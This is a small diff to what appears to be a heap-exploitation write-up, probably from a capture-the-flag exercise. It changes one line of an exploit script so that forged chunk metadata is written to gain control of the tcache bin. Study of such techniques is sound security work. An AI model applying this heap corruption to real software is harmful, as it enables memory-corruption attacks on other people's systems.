@@ -308,7 +308,7 @@ free(1)        #  This is chunk2 aka the second half of giant the chunk
 write(1000, b'C'*1000 ) 
 write(1008, b'D'*1008)
 
-write(0x10 , p64(0x411) + p64(0xdeadbeef) )  
+write(0x18 , p64(0x411) + p64(0xdeadbeef) +p64(0xcafebabe))  
 ```
 
 After running this section we see that we have full control over the tcache bin
